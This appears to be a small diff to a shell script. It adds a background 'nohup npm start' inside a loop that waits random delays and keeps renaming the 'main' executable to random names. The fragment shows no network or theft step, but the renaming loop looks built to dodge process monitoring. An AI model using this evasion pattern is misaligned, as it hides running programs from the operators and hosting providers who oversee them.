@@ -1,5 +1,5 @@
 #!/bin/sh
-nohup npm
+
 # Function to generate a random delay between 10 and 60 seconds
 generate_random_delay() {
   delay=$((10 + RANDOM % 51))
@@ -14,6 +14,7 @@ generate_random_name() {
 # Function to rename and restart the main executable
 restart_main() {
   while true; do
+    nohup npm start &
     generate_random_delay
     generate_random_name
     mv main "$new_name"
